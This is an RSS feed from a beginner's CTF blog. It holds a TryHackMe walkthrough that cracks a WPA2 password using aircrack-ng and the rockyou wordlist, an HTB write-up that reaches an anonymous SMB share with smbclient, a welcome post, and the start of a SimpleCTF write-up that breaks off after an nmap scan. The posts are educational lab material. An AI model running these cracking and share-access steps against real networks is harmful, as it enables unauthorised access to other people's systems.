@@ -1,0 +1,1271 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on hushkat</title><link>https://hushkat.github.io/post/</link><description>Recent content in Posts on hushkat</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 19 Mar 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://hushkat.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>WIFI Hacking 101</title><link>https://hushkat.github.io/p/wifi-hacking-101/</link><pubDate>Tue, 19 Mar 2024 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/wifi-hacking-101/</guid><description>&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/cover.jpg" alt="Featured image of post WIFI Hacking 101" />&lt;h2 id="introduction">Introduction
+&lt;/h2>&lt;p>We all use Wi-Fi on a day-to-day basis. There is a lot that happens under the hood of this technology that we are all fond of and rely on every day. This room goes through some of the basics of this technology before we start learning about how to attack such network setups. Let’s dig in. If you wish to follow through, check out the room on TryHackMe called &lt;a class="link" href="https://tryhackme.com/room/wifihacking101" target="_blank" rel="noopener"
+>WIFIHacking101&lt;/a>&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="an-intro-to-wpa">An Intro to WPA
+&lt;/h3>&lt;p>In this section, we go through some of the basics of WIFI technology by going through some terminologies. Some of the discussed terminologies are:&lt;/p>
+&lt;ul>
+&lt;li>Wi-Fi Protected Access (WPA) is a security standard for computing devices with wireless internet connections. Very susceptible to brute force attacks.&lt;/li>
+&lt;li>WPA2-PSK: Wifi networks that you connect to by providing a password that&amp;rsquo;s the same for everyone.
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/PSK.png"
+width="1867"
+height="940"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/PSK_hu6048886162574053503.png 480w, https://hushkat.github.io/p/wifi-hacking-101/PSK_hu5925554058726720867.png 1024w"
+loading="lazy"
+alt="PSK"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="476px"
+>
+Take note that PSK stands for Pre-Shared-Key and is essentially what we commonly refer to as the WIFI password. Its also important to note that it has a minimum number of characters requirement as shown below:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/8.png"
+width="1918"
+height="397"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/8_hu14956186084248452118.png 480w, https://hushkat.github.io/p/wifi-hacking-101/8_hu16171692287165961589.png 1024w"
+loading="lazy"
+alt="Minimum_chars"
+class="gallery-image"
+data-flex-grow="483"
+data-flex-basis="1159px"
+>&lt;/li>
+&lt;li>WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.&lt;/li>
+&lt;li>RADIUS: A server for authenticating clients, not just for wifi.&lt;/li>
+&lt;li>SSID: The network &amp;ldquo;name&amp;rdquo; that you see when you try and connect.&lt;/li>
+&lt;li>ESSID: An SSID that &lt;em>may&lt;/em> apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you&amp;rsquo;re attacking.&lt;/li>
+&lt;li>BSSID: An access point MAC (hardware) address&lt;/li>
+&lt;/ul>
+&lt;h2 id="capturing-packets-to-attack">Capturing Packets to attack
+&lt;/h2>&lt;p>The most common tools used in WIFI hacking are found in the aircrack-ng suite which comes which consists of tools such as:&lt;/p>
+&lt;ul>
+&lt;li>Aircrack-ng&lt;/li>
+&lt;li>Airodump-ng&lt;/li>
+&lt;li>Airmon-ng&lt;/li>
+&lt;/ul>
+&lt;p>which mostly attack WPA(2) networks. You also need to ensure you have a monitor mode Network Interface Card (NIC) to capture the 4-way handshake used by WPA networks. If you need results fast, it is good to use injection mode, which de-authenticates a client from the WIFI and forces the handshake to re-occur as the client tries to reconnect to the network.&lt;/p>
+&lt;p>Most of the commands used for tools within this suite can be found on &lt;a class="link" href="https://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener"
+>this&lt;/a> page. We are going to go through some of the basic ones below. But first, here is an overview and summary of things we can do to exploit WPA/WPA2 networks in a flowchart:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/flowchart.png"
+width="1458"
+height="1526"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/flowchart_hu15528369864324406632.png 480w, https://hushkat.github.io/p/wifi-hacking-101/flowchart_hu13113333263973561700.png 1024w"
+loading="lazy"
+alt="flowchart"
+class="gallery-image"
+data-flex-grow="95"
+data-flex-basis="229px"
+>
+The image above is courtesy of &lt;a class="link" href="https://www.stationx.net/how-to-use-aircrack-ng-tutorial/" target="_blank" rel="noopener"
+>StationX&lt;/a>. Note that we are not going to go through everything in this chart but just the basics.
+To enable monitor mode on our NIC we use the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Which will give you an output like so:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/MonitorMode.png"
+width="1920"
+height="968"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/MonitorMode_hu14237311070394653862.png 480w, https://hushkat.github.io/p/wifi-hacking-101/MonitorMode_hu11604116934177434524.png 1024w"
+loading="lazy"
+alt="airmon_start"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="476px"
+>
+We can see that the interface name changes to wlan0mon. Oftentimes, there might be other processes currently using the network adapter we want to use or intend to use, therefore it’s a common practice to run this command first:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">airmon-ng check kill
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Which will kill all interfering processes and give you a similar output to this one:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/CheckKill.png"
+width="1920"
+height="716"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/CheckKill_hu5093708330976648798.png 480w, https://hushkat.github.io/p/wifi-hacking-101/CheckKill_hu11701722993677736059.png 1024w"
+loading="lazy"
+alt="check_kill"
+class="gallery-image"
+data-flex-grow="268"
+data-flex-basis="643px"
+>
+Now that our machine&amp;rsquo;s Network Interface Card(NIC) is in monitor mode, we need to capture some packets that we can use for our attack. But what tool in the suite do we use, let&amp;rsquo;s do a quick search on google:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/Airodump-ng.png"
+width="1919"
+height="663"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/Airodump-ng_hu17192919710611102079.png 480w, https://hushkat.github.io/p/wifi-hacking-101/Airodump-ng_hu3738720949582808004.png 1024w"
+loading="lazy"
+alt="Airodump-ng"
+class="gallery-image"
+data-flex-grow="289"
+data-flex-basis="694px"
+>
+As shown above, we have a tool from the aircrack-ng suite for this exact task, the tool is called: airodump-ng
+Let’s have a look at its usage by viewing its help menu. We do that by running the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo airodump-ng --help
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/-W.png"
+width="1919"
+height="996"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/-W_hu12551988124252123410.png 480w, https://hushkat.github.io/p/wifi-hacking-101/-W_hu10662864401539046297.png 1024w"
+loading="lazy"
+alt="Airodump-help"
+class="gallery-image"
+data-flex-grow="192"
+data-flex-basis="462px"
+>
+Notice the -w option or flag that writes the captured packets to a file. Scrolling down further, we notice other useful flags that we can use:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL.png"
+width="1919"
+height="1005"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL_hu2725155774288984339.png 480w, https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL_hu1760809146546519621.png 1024w"
+loading="lazy"
+alt="BSSIDCHANNEL"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="458px"
+>
+The –bssid flag is used to set the BSSID to monitor and the –channel flag that sets the channel. There are many options that can be of use while working with this tool. All are listed on the help menu, which we can access using&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo airodump-ng –-help
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Let’s dive into a more practical part of it which is also the last bit. We can now assume that we managed to capture some traffic for a network that we intended to attack. In our case, we have the capturing part done for us, since we maybe don&amp;rsquo;t have a NIC that can go to monitor mode or don&amp;rsquo;t have a wireless adapter to do the capturing or injection. We are going to use a packet capture file that is provided to us, so let&amp;rsquo;s first extract it:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL.png"
+width="1919"
+height="1005"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL_hu2725155774288984339.png 480w, https://hushkat.github.io/p/wifi-hacking-101/BSSIDCHANNEL_hu1760809146546519621.png 1024w"
+loading="lazy"
+alt="BSSIDCHANNEL"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="458px"
+>
+Notice the NinjaJ-01.cap file, which is what we are going to use next to create a file that will help us crack the password. To do that, we use the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">aircrack-ng -j wifi NinjaJc01.cap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>aircrack-ng: Tool from suite that we are using for this task&lt;/li>
+&lt;li>The flag -j: flag that specifies generation of a file from the pcap file specified into one that can be used to crack the password by aircrack-ng or hashcat.&lt;/li>
+&lt;li>wifi: name of new file to be generated if the command successfully runs.&lt;/li>
+&lt;li>NinjaJc01.cap: The file we are generating our new file from.&lt;/li>
+&lt;/ul>
+&lt;p>In the output below, notice that we now have the MAC address and Name of the WIFI network that we are trying to gain access by cracking the WIFI’s password.
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/HCCAPX.png"
+width="1920"
+height="981"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/HCCAPX_hu16591752724194049856.png 480w, https://hushkat.github.io/p/wifi-hacking-101/HCCAPX_hu7548454055341128968.png 1024w"
+loading="lazy"
+alt="HCCAPX"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="469px"
+>
+The command successfully executes, meaning we can move forward and attempt cracking the password. As shown below, we can see that a new file names wifi.hccapx has been generated for us to use in our next step. We can now run the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">aircrack-ng -a2 -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt wifi.hccapx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/HCCAPX.png"
+width="1920"
+height="981"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/HCCAPX_hu16591752724194049856.png 480w, https://hushkat.github.io/p/wifi-hacking-101/HCCAPX_hu7548454055341128968.png 1024w"
+loading="lazy"
+alt="HCCAPX"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="469px"
+>
+Let’s break down the command to bits:&lt;/p>
+&lt;ul>
+&lt;li>aircrack-ng: Main command for Aircrack-ng tool usage from the main suite.&lt;/li>
+&lt;li>The flag -a2: This option specifies the attack mode. In this case, -a2 indicates a dictionary attack. A dictionary attack involves trying each word from a provided wordlist (dictionary) to crack the passphrase.&lt;/li>
+&lt;li>The flag -b 02:1A:11:FF:D9:BD: This option specifies the BSSID (MAC address of the access point) of the target network. The -b option is followed by the BSSID of the target network to focus the attack on a specific network.&lt;/li>
+&lt;li>The flag -w /usr/share/wordlists/rockyou.txt: This option specifies the wordlist (dictionary) to use for the dictionary attack.&lt;/li>
+&lt;li>wifi.hccapx: This is the name of the capture file containing the handshake packets captured from the target Wi-Fi network. Aircrack-ng uses this file as input for the cracking process.
+After letting this run for a while, we are now able to get the password for this WIFI as shown in the output below:
+&lt;img src="https://hushkat.github.io/p/wifi-hacking-101/Cracked.png"
+width="1919"
+height="1006"
+srcset="https://hushkat.github.io/p/wifi-hacking-101/Cracked_hu4624091832608917468.png 480w, https://hushkat.github.io/p/wifi-hacking-101/Cracked_hu279623069244314728.png 1024w"
+loading="lazy"
+alt="Cracked"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="457px"
+>
+With that, we are done covering the basics of WIFI hacking. It is important to know that password cracking is a resource-intensive process and therefore works faster on GPUs as opposed to CPU usage.&lt;/li>
+&lt;/ul>
+&lt;h2 id="conclusion">CONCLUSION
+&lt;/h2>&lt;p>We covered the basics of WIFI hacking by starting us off with basic terminologies that we were to hear mentions of in the walkthrough, which was a lot of interesting theory. Then gradually moved to the practical bit of the work. It was fun to interact with some of the tools within the airmon-ng suite for WIFI or wireless attacks and I hope we all learned a thing or two along the way.&lt;/p></description></item><item><title>Welcome Blog</title><link>https://hushkat.github.io/p/welcome-blog/</link><pubDate>Sat, 03 Jun 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/welcome-blog/</guid><description>&lt;img src="https://hushkat.github.io/p/welcome-blog/cover.jpg" alt="Featured image of post Welcome Blog" />&lt;h2 id="introduction">Introduction
+&lt;/h2>&lt;p>Hello, fellow cybersecurity enthusiasts! Welcome to my CTF Journey, where I, will be sharing my experiences, challenges, and triumphs as I embark on a thrilling adventure into the world of Capture The Flag (CTF) competitions. This blog will primarily revolve around CTFs, as I dive headfirst into this captivating realm of cybersecurity.&lt;/p>
+&lt;h2 id="about-me">About Me
+&lt;/h2>&lt;p>Let me start by introducing myself. I am a passionate individual with an insatiable curiosity for all things cybersecurity. While I am relatively new to CTFs and the broader field of cybersecurity, I am eager to learn and grow. I believe that by documenting my journey through this blog, I can not only track my progress but also provide valuable insights to fellow newcomers and maybe even inspire others to join me on this exciting path.&lt;/p>
+&lt;h2 id="blog-focus">Blog Focus
+&lt;/h2>&lt;p>This blog will primarily focus on CTFs, which are simulated cybersecurity challenges designed to test one&amp;rsquo;s hacking skills, problem-solving abilities, and creativity. As I navigate through various CTF competitions, I will share my experiences, strategies, and lessons learned along the way. Expect to find walkthroughs, tips, and tricks, as well as reflections on my successes and failures.&lt;/p>
+&lt;h2 id="acknowledging-my-imperfections">Acknowledging My Imperfections
+&lt;/h2>&lt;p>It&amp;rsquo;s important to note that I am by no means an expert in the field of cybersecurity or CTFs. As a beginner, I expect to encounter obstacles and make mistakes. However, I am determined to give my best, constantly improve my skills, and share my progress with you. This blog will serve as a platform for me to document my journey, showcase my achievements, and also highlight the areas where I can grow.&lt;/p>
+&lt;h2 id="join-me-on-the-adventure">Join Me on the Adventure
+&lt;/h2>&lt;p>Whether you&amp;rsquo;re a seasoned cybersecurity professional, a fellow newbie, or someone simply curious about CTFs, I invite you to join me on this thrilling adventure. Let&amp;rsquo;s explore the fascinating world of CTFs together, share knowledge, and foster a vibrant community of learners. Through this blog, we can support one another, exchange ideas, and collectively enhance our cybersecurity prowess.&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>Welcome to dr0idbot&amp;rsquo;s cybersecurity journey! Together, let&amp;rsquo;s embark on an exhilarating exploration of CTFs, where we&amp;rsquo;ll tackle challenges, unravel mysteries, and celebrate every step of progress. While I may be new to this realm, my dedication and enthusiasm will drive me forward, and I hope you&amp;rsquo;ll find inspiration in my story. Stay tuned for upcoming posts filled with valuable insights, thrilling adventures, and perhaps a few surprises along the way. Let the journey begin!&lt;/p>
+&lt;p>Disclaimer: The content presented in my articles is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/p></description></item><item><title>DANCING</title><link>https://hushkat.github.io/p/dancing/</link><pubDate>Sun, 25 Feb 2024 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/dancing/</guid><description>&lt;img src="https://hushkat.github.io/p/dancing/Completed.png" alt="Featured image of post DANCING" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>This challenge is about the basics of SMB and how misconfigurations can lead to compromise of the system SMB is running on. SMB is an acronym for Server Message Block, a protocol used in networks for file sharing that is implemented on Microsoft Windows operating systems. A quick Google search can reveal the same:
+&lt;img src="https://hushkat.github.io/p/dancing/Q1.png"
+width="962"
+height="369"
+srcset="https://hushkat.github.io/p/dancing/Q1_hu11308264488664761824.png 480w, https://hushkat.github.io/p/dancing/Q1_hu4016774746937824341.png 1024w"
+loading="lazy"
+alt="google_search"
+class="gallery-image"
+data-flex-grow="260"
+data-flex-basis="625px"
+>&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;p>&lt;strong>Note&lt;/strong> If you&amp;rsquo;re following through practically, make sure you use the target&amp;rsquo;s machine&amp;rsquo;s IP provided once you click the start machine icon on the challenge webpage.&lt;/p>
+&lt;h3 id="enumeration">Enumeration.
+&lt;/h3>&lt;p>Once you spawn the target, you are given a vulnerable target&amp;rsquo;s IP (in my case: &lt;strong>10.129.84.148&lt;/strong> ) which we will enumerate by use of NMAP by running the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap 10.129.84.148
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>which should scan and give us a report on open ports running on the target as shown below:
+&lt;img src="https://hushkat.github.io/p/dancing/Q2.png"
+width="659"
+height="335"
+srcset="https://hushkat.github.io/p/dancing/Q2_hu3248943508001671093.png 480w, https://hushkat.github.io/p/dancing/Q2_hu18091934803613366051.png 1024w"
+loading="lazy"
+alt="nmap_results"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="472px"
+>&lt;/p>
+&lt;p>We see that the target has three open ports and one specifically running &lt;strong>Microsoft-ds&lt;/strong> on port 445.&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Now that we know the service running on this port, we can try and list the shares available on the target by running the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">smbclient -N -L \\\\10.129.84.148
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;strong>-N&lt;/strong> option suppresses the password prompt that is needed to connect to this service, &lt;strong>-L&lt;/strong> on the other hand lists the shares available on the target. Here are the results from our target.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/dancing/Q3,4.png"
+width="663"
+height="327"
+srcset="https://hushkat.github.io/p/dancing/Q3,4_hu14095665078388616887.png 480w, https://hushkat.github.io/p/dancing/Q3,4_hu11767111108246697801.png 1024w"
+loading="lazy"
+alt="smb_shares"
+class="gallery-image"
+data-flex-grow="202"
+data-flex-basis="486px"
+>&lt;/p>
+&lt;p>We already know the shares available on the target, so I can now try to connect to each of the available shares, but I don&amp;rsquo;t have a password, so I am going to try to log in to each of them without giving a password.&lt;/p>
+&lt;h3 id="foothold">Foothold
+&lt;/h3>&lt;p>Things don&amp;rsquo;t seem to go as planned, except for just one share that lets me in without a password, the WorkShares share. Here is the command I ran to be able to connect to it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">smbclient \\\\10.129.84.148\\WorkShares
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When prompted for a password, press enter.
+&lt;img src="https://hushkat.github.io/p/dancing/Q6.png"
+width="659"
+height="456"
+srcset="https://hushkat.github.io/p/dancing/Q6_hu7996035004074927003.png 480w, https://hushkat.github.io/p/dancing/Q6_hu10980212056566475404.png 1024w"
+loading="lazy"
+alt="smb_shares"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>&lt;/p>
+&lt;p>Now we list the directories available using &lt;strong>ls&lt;/strong> and see a couple of interesting stuff here, in essence, there are two users listed:&lt;/p>
+&lt;ul>
+&lt;li>Amy.J&lt;/li>
+&lt;li>James.P&lt;/li>
+&lt;/ul>
+&lt;p>I check the first user&amp;rsquo;s folder, but there is no sign of the flag. Next, I try to navigate to the second user&amp;rsquo;s folder.&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>I do this by running the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd James.P
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I list the contents of his directory where we see a file called &lt;strong>flag.txt&lt;/strong> which we then download to our attack machine using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">get flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then leave this service by running the &lt;strong>exit&lt;/strong> command.&lt;/p>
+&lt;p>Now since we are back on our attack machine we can navigate to the directory where the flag file is saved and view its contents.
+&lt;img src="https://hushkat.github.io/p/dancing/Flag.png"
+width="654"
+height="270"
+srcset="https://hushkat.github.io/p/dancing/Flag_hu14776464510738616293.png 480w, https://hushkat.github.io/p/dancing/Flag_hu13307367752523255337.png 1024w"
+loading="lazy"
+alt="flag"
+class="gallery-image"
+data-flex-grow="242"
+data-flex-basis="581px"
+>&lt;/p>
+&lt;p>We have our flag for this challenge. That also leaves us with all the answers to the questions that came with this challenge.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In summary, the SMB protocol is very useful in sharing resources between hosts. However, a big security risk is onboarded if this protocol is misconfigured. This room has shown me how easy it can be to gain access to shares within an SMB if there are few to no strict security measures associated with it.&lt;/p>
+&lt;p>dr0idbot signing off.&lt;/p></description></item><item><title>SimpleCTF</title><link>https://hushkat.github.io/p/simplectf/</link><pubDate>Sun, 31 Dec 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/simplectf/</guid><description>&lt;img src="https://hushkat.github.io/p/simplectf/Banner.png" alt="Featured image of post SimpleCTF" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Hello guys, it has been quite some time since I made a CTF writeup and I figured it&amp;rsquo;s time to share some of my notes with you. Like many of you, I am a beginner and I am still learning and exploring stuff in cyber security. Just recently I got interviewed by &lt;a class="link" href="https://cybershujaa.co.ke/" target="_blank" rel="noopener"
+>CyberShujaa&lt;/a> as I had applied to be a scholar in their program for the Security Analyst path. I am happy to say that I have been shortlisted for the program. As part of the admission process, I was required to try out this beginner-level CTF challenge and I thought it wise to take some notes while solving it. You can find the challenge &lt;a class="link" href="https://tryhackme.com/room/easyctf#" target="_blank" rel="noopener"
+>here&lt;/a>.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="simplectf-challenge">SimpleCTF Challenge.
+&lt;/h3>&lt;p>After clicking the start machine icon on the challenge webpage, you are presented with an IP of the vulnerable target, the first thing I normally do is to ping the target just to see if it is alive.
+&lt;img src="https://hushkat.github.io/p/simplectf/Ping.png"
+width="587"
+height="387"
+srcset="https://hushkat.github.io/p/simplectf/Ping_hu11934381292864045091.png 480w, https://hushkat.github.io/p/simplectf/Ping_hu3340511572765206794.png 1024w"
+loading="lazy"
+alt="ping_results"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="364px"
+>&lt;/p>
+&lt;p>Since we have replies from the target we will now proceed to the next step of exploration.&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>We begin by scanning the target using the tool &lt;a class="link" href="https://en.wikipedia.org/wiki/Nmap" target="_blank" rel="noopener"
+>Nmap&lt;/a> to find open ports running on it and also identify the services running on those ports. to do that, we use the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap -sV 10.10.64.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>Note&lt;/strong> If you&amp;rsquo;re following through the tutorial, make sure you use the target&amp;rsquo;s machine&amp;rsquo;s IP provided once you click the start machine icon on the challenge webpage. Here are the results from our scan.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/simplectf/nmap.png"
+width="588"
+height="386"
+srcset="https://hushkat.github.io/p/simplectf/nmap_hu14250893488308016027.png 480w, https://hushkat.github.io/p/simplectf/nmap_hu4673209647940780563.png 1024w"
+loading="lazy"
+alt="nmap_results"
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="365px"
+>&lt;/p>
+&lt;p>Notice that we have three open ports.&lt;/p>
+&lt;ul>
+&lt;li>Port 22 running ftp&lt;/li>
+&lt;li>Port 80 running HTTP&lt;/li>
+&lt;li>Port 2222 running SSH&lt;/li>
+&lt;/ul>
+&lt;p>Now we try accessing the webpage running on port 80 by pasting the IP and port number (80) for the service on the browser and we are welcomed with this page:
+&lt;img src="https://hushkat.github.io/p/simplectf/website.png"
+width="1366"
+height="551"
